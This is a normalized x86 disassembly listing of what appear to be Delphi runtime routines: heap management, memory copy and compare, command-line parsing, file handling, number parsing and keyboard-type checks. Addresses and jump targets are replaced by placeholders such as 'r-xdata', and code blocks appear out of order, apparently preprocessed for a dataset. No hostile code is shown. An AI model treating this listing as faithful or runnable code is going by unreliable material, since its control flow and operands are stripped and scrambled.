jg r-xdata
add eax 0x3
mov eax edx
retn
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
jne r-xdata
inc eax
cmp eax 0x401
jne r-xdata
sub_402088
push ebx
push esi
push edi
push ebp
mov esi eax
mov edi rw-data
mov ebp rw-data
mov eax ebx
call sub_401c34
mov edx [ ebx + 0x8 ]
mov eax edx
sub eax esi
cmp eax 0xc
jl r-xdata
mov ebx [ edi ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov esi edx
cmp ebx [ edi ]
jne r-xdata
mov edx ebx
add edx esi
xchg edx eax
call sub_401e9c
jmp r-xdata
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
and [ eax ] 0xfffffffe
mov eax [ ebx + 0x4 ]
mov [ edi ] eax
mov eax ebx
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
mov ebx [ ebx + 0x4 ]
cmp esi [ ebx + 0x8 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x8 ] eax
cmp ebx [ edi ]
je r-xdata
cmp esi 0x1000
jg r-xdata
mov [ edi ] ebx
jmp r-xdata
mov eax esi
call sub_401ffc
test al al
jne r-xdata
mov eax esi
call sub_40205c
mov ebx eax
test ebx ebx
jne r-xdata
cmp esi [ ebp ]
jg r-xdata
xor eax eax
jmp r-xdata
mov ebx [ rw-data ]
cmp esi [ ebx + 0x8 ]
jle r-xdata
sub [ ebp ] esi
cmp [ ebp ] 0xc
jge r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
add [ rw-data ] esi
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
jmp r-xdata
add esi [ ebp ]
xor eax eax
mov [ ebp ] eax
sub_40217c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
cmp ebx 0x7ffffff8
jle r-xdata
call sub_401a90
test al al
je r-xdata
xor ecx ecx
push ebp
push sub_4022f8
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
add ebx 0x7
and ebx 0xfffffffc
cmp ebx 0xc
jge r-xdata
push rw-data
call sub_4013ec
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
cmp ebx 0x1000
jg r-xdata
mov ebx 0xc
cmp ebx [ rw-data ]
jg r-xdata
mov eax ebx
test eax eax
jns r-xdata
mov eax ebx
call sub_402088
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub [ rw-data ] ebx
cmp [ rw-data ] 0xc
jge r-xdata
sar eax 0x2
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
je r-xdata
add eax 0x3
retn
push rw-data
call sub_4013f4
mov eax [ rw-data ]
add [ rw-data ] ebx
mov edx ebx
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_403f38
jmp r-xdata
add ebx [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edx
mov eax esi
add eax ebx
and [ eax ] 0xfffffffe
mov eax [ edx + 0x4 ]
cmp edx eax
jne r-xdata
mov ecx ebx
test ecx ecx
jns r-xdata
mov eax ebx
test eax eax
jns r-xdata
sar ecx 0x2
mov edi [ rw-data ]
mov [ edi + ecx * 4 - 0xc ] eax
mov ecx [ edx ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x4 ] eax
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
add ecx 0x3
sar eax 0x2
mov ecx [ rw-data ]
xor edi edi
mov [ ecx + eax * 4 - 0xc ] edi
jmp r-xdata
add eax 0x3
mov eax esi
mov edx [ edx + 0x8 ]
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_403f38
jmp r-xdata
sub_40230c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
push ebp
push sub_40249e
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_401a90
test al al
jne r-xdata
mov esi ebx
sub esi 0x4
mov ebx [ esi ]
test bl 0x2
jne r-xdata
push rw-data
call sub_4013ec
mov [ rw-data ] 0x8
mov [ ebp - 0x4 ] 0x8
jmp r-xdata
dec [ rw-data ]
mov eax ebx
and eax 0x7ffffffc
sub eax 0x4
sub [ rw-data ] eax
test bl 0x1
je r-xdata
mov [ rw-data ] 0x9
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
and ebx 0x7ffffffc
mov eax esi
add eax ebx
mov edi eax
cmp edi [ rw-data ]
jne r-xdata
mov eax esi
sub eax 0xc
mov edx [ eax + 0x8 ]
cmp edx 0xc
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
test dl 0x2
je r-xdata
sub [ rw-data ] ebx
add [ rw-data ] ebx
cmp [ rw-data ] 0x3c00
jle r-xdata
mov [ rw-data ] 0xa
jmp r-xdata
test edx 0x80000003
je r-xdata
retn
push rw-data
call sub_4013f4
mov eax edi
cmp [ eax + 0x4 ] 0x0
je r-xdata
and edx 0x7ffffffc
cmp edx 0x4
jge r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
call sub_403f38
jmp r-xdata
call sub_401f24
mov eax esi
sub eax edx
cmp edx [ eax + 0x8 ]
je r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
or [ eax ] 0x1
jmp r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
add ebx edx
mov esi eax
call sub_401c34
mov [ rw-data ] 0xa
jmp r-xdata
cmp [ eax + 0x8 ] 0xc
jge r-xdata
mov edx ebx
mov eax esi
call sub_401e9c
mov edx [ eax + 0x8 ]
add ebx edx
call sub_401c34
sub_4024b0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
add esi 0x7
and esi 0xfffffffc
cmp esi 0xc
jge r-xdata
mov ebp eax
sub ebp 0x4
mov edi [ ebp ]
and edi 0x7ffffffc
mov eax ebp
add eax edi
mov ebx eax
cmp edi esi
jl r-xdata
mov esi 0xc
mov eax esi
sub eax edi
mov [ esp + 0x4 ] eax
cmp ebx [ rw-data ]
jne r-xdata
mov edx edi
sub edx esi
mov [ esp ] edx
cmp ebx [ rw-data ]
jne r-xdata
test [ ebx ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp eax [ esp + 0x4 ]
jl r-xdata
mov ebx eax
test [ ebx ] 0x2
jne r-xdata
mov eax [ esp ]
sub [ rw-data ] eax
mov eax [ esp ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
mov edx ebx
mov eax edx
mov ecx [ eax + 0x8 ]
mov [ esp ] ecx
mov ecx [ esp ]
cmp ecx [ esp + 0x4 ]
jge r-xdata
call sub_401f24
mov ebx ebp
add ebx edi
mov eax [ esp + 0x4 ]
sub [ rw-data ] eax
mov eax [ esp + 0x4 ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
cmp [ esp ] 0xc
jl r-xdata
mov eax ebx
mov edx [ eax + 0x8 ]
add [ esp ] edx
call sub_401c34
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
mov eax [ esp ]
add [ rw-data ] eax
mov eax [ esp ]
sub [ rw-data ] eax
mov esi edi
jmp r-xdata
xor eax eax
jmp r-xdata
and eax 0x7ffffffc
add eax ebx
mov ebx eax
mov edx [ esp + 0x4 ]
mov eax ebx
call sub_402028
test al al
je r-xdata
call sub_401c34
mov eax [ esp + 0x4 ]
sub [ esp ] eax
cmp [ esp ] 0xc
jl r-xdata
add edx [ esp ]
mov ebx edx
mov eax [ esp ]
sub [ esp + 0x4 ] eax
jmp r-xdata
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
jmp r-xdata
mov eax [ rw-data ]
add [ rw-data ] eax
add esi [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edi
jmp r-xdata
mov ebx ebp
add ebx esi
mov eax [ esp ]
or eax 0x2
mov [ ebx ] eax
mov eax ebx
add eax 0x4
call sub_401cf8
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx ebp
add ebx edi
jmp r-xdata
add esi [ esp ]
mov ebx ebp
add ebx esi
and [ ebx ] 0xfffffffe
jmp r-xdata
mov eax ebp
add eax esi
mov edx [ esp ]
call sub_401e9c
jmp r-xdata
sub_402680
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_402731
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_401a90
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_4024b0
test al al
je r-xdata
push rw-data
call sub_4013ec
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax esi
call sub_40217c
mov edi eax
mov eax ebx
sub eax 0x4
mov eax [ eax ]
and eax 0x7ffffffc
sub eax 0x4
cmp esi eax
jge r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
test edi edi
je r-xdata
mov eax esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov [ ebp - 0x4 ] edi
mov edx edi
mov ecx ebx
xchg ecx eax
call sub_4028fc
mov eax ebx
call sub_40230c
retn
push rw-data
call sub_4013f4
sub_402744
push ebx
test eax eax
jle r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
mov al 0x1
call sub_4028a0
sub_402764
push ebx
test eax eax
je r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov al 0x2
call sub_4028a0
sub_402784
mov ecx [ eax ]
test ecx ecx
je r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
retn
push eax
mov eax edx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov [ eax ] edx
mov eax ecx
call [ rw-data ]
or eax eax
jne r-xdata
push eax
mov eax ecx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov al 0x1
jmp sub_4028a0
mov [ ecx ] eax
mov al 0x2
jmp sub_4028a0
retn
mov [ ecx ] eax
retn
sub_402814
push ebx
push esi
call sub_4067f8
cmp [ eax ] 0x0
je r-xdata
xor ebx ebx
call sub_4067f8
mov esi [ eax ]
mov ebx [ esi + 0x8 ]
call sub_4067f8
xor eax eax
mov [ esi + 0x8 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_402854
push ebx
push esi
mov esi edx
mov ebx eax
and bl 0x7f
cmp [ rw-data ] 0x0
je r-xdata
test bl bl
jne r-xdata
mov edx esi
mov eax ebx
call [ rw-data ]
cmp bl 0x18
ja r-xdata
call sub_4067f8
mov ebx [ eax + 0x4 ]
jmp r-xdata
xor eax eax
mov al bl
mov edx esi
call sub_402848
xor eax eax
mov al bl
mov bl [ eax + rw-data ]
sub_4028fc
push esi
push edi
mov esi eax
mov edi edx
mov eax ecx
cmp edi esi
ja r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
sar ecx 0x2
js r-xdata
je r-xdata
pop edi
pop esi
retn
std
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
add esi 0x3
add edi 0x3
[ edi ] [ esi ]
cld
sar ecx 0x2
js r-xdata
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
retn
sub_40293c
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
jmp r-xdata
mov al [ ebx ]
test al al
je r-xdata
cmp [ ebx ] 0x22
jne r-xdata
cmp al 0x20
jbe r-xdata
xor ebp ebp
mov edi ebx
jmp r-xdata
cmp [ ebx + 0x1 ] 0x22
jne r-xdata
push ebx
call sub_4012b0
mov ebx eax
mov al [ ebx ]
cmp al 0x20
ja r-xdata
add ebx 0x2
jmp r-xdata
cmp al 0x22
jne r-xdata
mov eax esi
mov edx ebp
call sub_404a68
mov ebx edi
mov edi [ esi ]
xor esi esi
jmp r-xdata
push ebx
call sub_4012b0
mov edx eax
sub edx ebx
add ebp edx
mov ebx eax
push ebx
call sub_4012b0
mov ebx eax
jmp r-xdata
mov al [ ebx ]
cmp al 0x20
ja r-xdata
mov al [ ebx ]
test al al
je r-xdata
cmp al 0x22
jne r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebx ] 0x0
je r-xdata
cmp al 0x22
jne r-xdata
push ebx
call sub_4012b0
cmp eax ebx
jbe r-xdata
push ebx
call sub_4012b0
mov ebx eax
jmp r-xdata
push ebx
call sub_4012b0
mov ebx eax
jmp r-xdata
push ebx
call sub_4012b0
mov edx eax
sub edx ebx
add ebp edx
mov ebx eax
mov dl [ ebx ]
mov [ edi + esi ] dl
inc ebx
inc esi
cmp eax ebx
ja r-xdata
mov al [ ebx ]
test al al
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp al 0x22
jne r-xdata
push ebx
call sub_4012b0
mov ebx eax
jmp r-xdata
push ebx
call sub_4012b0
cmp eax ebx
jbe r-xdata
mov dl [ ebx ]
mov [ edi + esi ] dl
inc ebx
inc esi
cmp eax ebx
ja r-xdata
sub_402a28
push ebx
push esi
push edi
add esp 0xfffffef8
mov ebx edx
mov esi eax
mov eax ebx
call sub_40442c
test esi esi
jne r-xdata
call GetCommandLineA
mov edi eax
push 0x105
lea eax [ esp + 0x4 ]
push eax
push 0x0
call sub_4012f8
mov ecx eax
mov edx esp
mov eax ebx
call sub_40451c
jmp r-xdata
add esp 0x108
pop edi
pop esi
pop ebx
retn
cmp [ ebx ] 0x0
je r-xdata
dec esi
jmp r-xdata
mov edx ebx
mov eax edi
call sub_40293c
mov edi eax
test esi esi
je r-xdata
sub_402a94
fld st0
sub esp 0x4
fnstcw [ esp ]
fnstcw [ esp + 0x2 ]
fwait
or [ esp + 0x2 ] 0xf00
fldcw [ esp + 0x2 ]
frndint
fwait
fldcw [ esp ]
add esp 0x4
fsubp st1
retn
sub_402ac4
sub esp 0xc
fnstcw [ esp ]
fnstcw [ esp + 0x2 ]
fwait
or [ esp + 0x2 ] 0xf00
fldcw [ esp + 0x2 ]
fistp [ esp + 0x4 ]
fwait
fldcw [ esp ]
pop ecx
pop eax
pop edx
retn
sub_402b04
push ebx
push esi
mov esi edx
mov ebx eax
mov ax [ ebx + 0x4 ]
cmp ax 0xd7b0
jb r-xdata
mov ebx 0x66
jmp r-xdata
cmp ax 0xd7b3
jbe r-xdata
test ebx ebx
je r-xdata
cmp ax 0xd7b0
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax ebx
call sub_4028cc
mov [ ebx + 0x4 ] si
cmp [ ebx + 0x48 ] 0x0
jne r-xdata
mov eax ebx
call sub_402e20
mov eax ebx
call [ ebx + 0x18 ]
mov ebx eax
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov [ ebx + 0x18 ] sub_402c14
sub_402b68
push ebx
mov ebx eax
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
push 0x0
lea eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx ]
push eax
call sub_401280
test eax eax
jne r-xdata
xor eax eax
call sub_4012e8
cmp eax 0x6d
jne r-xdata
pop ebx
retn
xor eax eax
pop ebx
retn
sub_402ba8
push ebx
push esi
push ecx
mov ebx eax
mov esi [ ebx + 0xc ]
test esi esi
jne r-xdata
push 0x0
lea eax [ esp + 0x4 ]
push eax
push esi
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx ]
push eax
call sub_4012a8
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
xor eax eax
call sub_4012e8
jmp r-xdata
pop edx
pop esi
pop ebx
retn
xor edx edx
mov [ ebx + 0xc ] edx
sub_402bf4
push ebx
mov ebx eax
mov [ ebx + 0x4 ] 0xd7b0
mov eax [ ebx ]
call sub_402be4
test al al
jne r-xdata
xor eax eax
pop ebx
retn
call sub_4012e8
pop ebx
retn
sub_402c14
push esi
mov esi eax
xor eax eax
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] eax
mov ax [ esi + 0x4 ]
sub eax 0xd7b1
je r-xdata
mov eax 0x80000000
mov edx 0x1
mov ecx 0x3
mov [ esi + 0x1c ] sub_402b68
jmp r-xdata
dec eax
je r-xdata
mov [ esi + 0x24 ] sub_402bf4
mov [ esi + 0x20 ] sub_402ba4
cmp [ esi + 0x48 ] 0x0
je r-xdata
mov eax 0x40000000
mov edx 0x1
mov ecx 0x2
jmp r-xdata
dec eax
je r-xdata
lea eax [ esi + 0x14c ]
mov [ esi + 0x8 ] 0x80
mov [ esi + 0x24 ] sub_402ba4
mov [ esi + 0x14 ] eax
cmp [ esi + 0x4 ] 0xd7b2
je r-xdata
push 0x0
push 0x80
push ecx
push 0x0
push edx
push eax
lea eax [ esi + 0x48 ]
push eax
call sub_401258
cmp eax 0xffffffff
je r-xdata
mov [ esi + 0x1c ] sub_402ba8
mov eax 0xc0000000
mov edx 0x1
mov ecx 0x3
jmp r-xdata
cmp esi rw-data
jne r-xdata
push 0xfffffff6
jmp r-xdata
mov [ esi + 0x4 ] 0xd7b0
call sub_4012e8
jmp r-xdata
mov [ esi ] eax
cmp [ esi + 0x4 ] 0xd7b3
jne r-xdata
pop esi
retn
push 0xfffffff5
push 0xfffffff4
jmp r-xdata
call sub_401270
cmp eax 0xffffffff
je r-xdata
cmp [ esi + 0x4 ] 0xd7b1
je r-xdata
dec [ esi + 0x4 ]
push 0x0
push [ esi ]
call GetFileSize
inc eax
je r-xdata
mov [ esi ] eax
xor eax eax
push [ esi ]
call GetFileType
test eax eax
je r-xdata
sub eax 0x81
jae r-xdata
push [ esi ]
call sub_401250
mov [ esi + 0x4 ] 0xd7b0
mov eax 0x69
jmp r-xdata
cmp eax 0x2
jne r-xdata
push 0x0
push 0x0
push eax
push [ esi ]
call sub_401298
inc eax
je r-xdata
xor eax eax
mov [ esi + 0x20 ] sub_402ba8
push 0x0
mov edx esp
push 0x0
push edx
push 0x80
lea edx [ esi + 0x14c ]
push edx
push [ esi ]
call sub_401280
pop edx
dec eax
jne r-xdata
xor eax eax
cmp [ esi + eax + 0x14c ] 0xe
je r-xdata
push 0x2
push 0x0
sub eax edx
push eax
push [ esi ]
call sub_401298
inc eax
je r-xdata
inc eax
jmp r-xdata
push [ esi ]
call sub_401290
dec eax
jne r-xdata
cmp eax edx
jae r-xdata
jmp r-xdata
sub_402dc0
push ebx
mov cx [ eax + 0x4 ]
sub cx 0xd7b1
je r-xdata
xor ebx ebx
jmp r-xdata
dec ecx
sub cx 0x2
jae r-xdata
test ebx ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov ebx edx
call ebx
mov ebx eax
jmp r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_4028cc
xor ebx ebx
jmp r-xdata
cmp eax rw-data
jne r-xdata
mov ebx 0x67
sub_402e20
push ebx
push esi
mov ebx eax
xor esi esi
mov ax [ ebx + 0x4 ]
cmp ax 0xd7b1
jb r-xdata
cmp ebx rw-data
je r-xdata
cmp ax 0xd7b3
ja r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax 0x67
call sub_4028cc
and ax 0xd7b2
cmp ax 0xd7b2
jne r-xdata
test esi esi
jne r-xdata
mov eax ebx
call [ ebx + 0x1c ]
mov esi eax
test esi esi
je r-xdata
mov eax ebx
call [ ebx + 0x24 ]
mov esi eax
mov eax esi
call sub_4028cc
jmp r-xdata
sub_402e78
push esi
push edi
mov edi eax
xor eax eax
mov al [ edi ]
mov esi edx
xor edx edx
mov dl [ esi ]
inc esi
add al dl
jb r-xdata
mov al cl
sub cl [ edi ]
jbe r-xdata
cmp al cl
ja r-xdata
pop edi
pop esi
retn
mov dl cl
jmp r-xdata
mov ecx edx
mov dl [ edi ]
mov [ edi ] al
inc edi
add edi edx
[ edi ] [ esi ]
sub_402eb4
push ebx
mov bl [ edx ]
cmp cl bl
jbe r-xdata
mov [ eax ] cl
inc edx
inc eax
and ecx 0xff
xchg edx eax
call sub_4028fc
pop ebx
retn
mov ecx ebx
sub_402ed0
push ebx
push esi
push edi
mov esi eax
mov edi edx
xor eax eax
xor edx edx
mov al [ esi ]
mov dl [ edi ]
inc esi
inc edi
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cl [ esi ]
cmp cl [ edi ]
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
pop edi
pop esi
pop ebx
retn
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
mov cl [ esi + 0x1 ]
cmp cl [ edi + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ esi + 0x2 ]
cmp cl [ edi + 0x2 ]
jne r-xdata
sub_402f54
push ebx
push esi
push ecx
mov esi ecx
shr esi 0x2
je r-xdata
pop esi
and esi 0x3
je r-xdata
mov ecx [ eax ]
mov ebx [ edx ]
cmp ecx ebx
jne r-xdata
pop esi
pop ebx
retn
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
pop esi
cmp cl bl
jne r-xdata
dec esi
je r-xdata
dec esi
je r-xdata
cmp ch bh
jne r-xdata
add eax 0x4
add edx 0x4
mov ecx [ eax + 0x4 ]
mov ebx [ edx + 0x4 ]
cmp ecx ebx
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov cl [ eax + 0x1 ]
cmp cl [ edx + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add eax 0x8
add edx 0x8
dec esi
jne r-xdata
dec esi
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ eax + 0x2 ]
cmp cl [ edx + 0x2 ]
jne r-xdata
sub_402fc4
push edi
mov edi eax
mov ch cl
mov eax ecx
shl eax 0x10
mov ax cx
mov ecx edx
sar ecx 0x2
js r-xdata
pop edi
retn
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
sub_402fe4
push ebx
push esi
push edi
mov esi eax
push eax
test eax eax
je r-xdata
inc esi
jmp r-xdata
xor eax eax
xor ebx ebx
mov edi 0xccccccc
pop ebx
sub esi ebx
jmp r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x20
je r-xdata
mov ch 0x0
cmp bl 0x2d
je r-xdata
mov [ edx ] esi
pop edi
pop esi
pop ebx
retn
inc ch
cmp bl 0x2b
je r-xdata
test bl bl
je r-xdata
mov bl [ esi ]
inc esi
jmp r-xdata
cmp bl 0x24
je r-xdata
sub bl 0x30
cmp bl 0x9
ja r-xdata
mov edi 0xfffffff
mov bl [ esi ]
inc esi
test bl bl
je r-xdata
cmp bl 0x78
je r-xdata
cmp eax edi
ja r-xdata
cmp bl 0x61
jb r-xdata
cmp bl 0x58
je r-xdata
lea eax [ eax + eax * 4 ]
add eax eax
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
sub bl 0x30
cmp bl 0x9
jbe r-xdata
sub bl 0x20
cmp bl 0x30
jne r-xdata
dec ch
je r-xdata
cmp eax edi
ja r-xdata
sub bl 0x11
cmp bl 0x5
ja r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x78
je r-xdata
neg eax
jle r-xdata
test eax eax
jge r-xdata
shl eax 0x4
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
add bl 0xa
cmp bl 0x58
je r-xdata
pop ecx
xor esi esi
js r-xdata
jmp r-xdata
test bl bl
je r-xdata
jmp r-xdata
sub_4030b0
push ebx
mov ebx eax
cmp ebx rw-data
je r-xdata
xor eax eax
mov al [ rw-data ]
mov [ ebx + 0x6 ] ax
mov eax ebx
call sub_402b5c
cmp ebx rw-data
jne r-xdata
mov eax ebx
pop ebx
retn
mov eax 0x69
call sub_4028cc
cmp [ ebx + 0x4 ] 0xd7b2
sete al
mov ebx eax
test bl bl
jne r-xdata
sub_4030f4
push esi
push edi
mov esi edx
cmp [ eax + 0x4 ] 0xd7b2
je r-xdata
mov edi [ eax + 0x14 ]
add edi [ eax + 0xc ]
mov edx [ eax + 0x8 ]
sub edx [ eax + 0xc ]
cmp edx ecx
jg r-xdata
push eax
push edx
push ecx
call sub_4030b0
test al al
pop ecx
pop edx
pop eax
je r-xdata
add [ eax + 0xc ] ecx
[ edi ] [ esi ]
add [ eax + 0xc ] edx
sub ecx edx
push eax
push ecx
mov ecx edx
[ edi ] [ esi ]
call [ eax + 0x1c ]
test eax eax
jne r-xdata
pop edi
pop esi
retn
call sub_4028cc
pop ecx
pop eax
pop edi
pop esi
retn
pop ecx
pop eax
jmp r-xdata
sub_403148
mov ecx edx
test ecx ecx
jg sub_4030f4
sub ecx 0x40
push eax
push ecx
mov ecx 0x40
call sub_4030f4
call sub_4067f8
cmp [ eax + 0x4 ] 0x0
jne r-xdata
retn
pop ecx
pop eax
retn
pop ecx
pop eax
jmp r-xdata
mov edx r-xdata
cmp ecx 0x40
jle r-xdata
sub_4031d0
push ebx
push eax
cmp ecx 0xff
jbe r-xdata
mov bl [ edx ]
inc edx
test bl bl
je r-xdata
mov ecx 0xff
pop edx
sub eax edx
mov [ edx ] al
pop ebx
retn
inc eax
mov [ eax ] bl
dec ecx
jne r-xdata
sub_403210
push ebx
xor ebx ebx
test eax eax
jl r-xdata
neg eax
cmp eax 0x1400
jge r-xdata
je r-xdata
fldz
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_4032bf ]
fdivp st1
shr eax 0x5
je r-xdata
pop ebx
retn
cmp eax 0x1400
jge r-xdata
mov edx eax
and edx 0xf
je r-xdata
fld [ ebx + r-xdata ]
jmp r-xdata
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_4032bf ]
fmulp st1
shr eax 0x5
je r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fdivp st1
mov edx eax
and edx 0xf
je r-xdata
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fdivp st1
jmp r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fmulp st1
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fmulp st1
jmp r-xdata
sub_4032bf
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3fff ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4002 ] ah
add [ eax ] al
add [ eax ] al
add al cl
add eax 0x40
add [ eax ] al
add [ eax ] al
cli
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x64 ] al
or al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
retn
sub_4034f8
push ebx
xor ebx ebx
push 0x0
call GetKeyboardType
cmp eax 0x7
jne r-xdata
mov eax ebx
pop ebx
retn
push 0x1
call GetKeyboardType
and eax 0xff00
cmp eax 0xd00
je r-xdata
mov bl 0x1
cmp eax 0x400
jne r-xdata
sub_403528
push ebp
mov ebp esp
add esp 0xfffffff4
movzx eax [ rw-data ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push 0x0
push r-xdata
push 0x80000002
call sub_401350
test eax eax
jne r-xdata
mov ax [ rw-data ]
and ax 0xffc0
mov dx [ ebp - 0x8 ]
and dx 0x3f
or ax dx
mov [ rw-data ] ax
mov esp ebp
pop ebp
retn
xor eax eax
push ebp
push sub_403599
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
push r-xdata
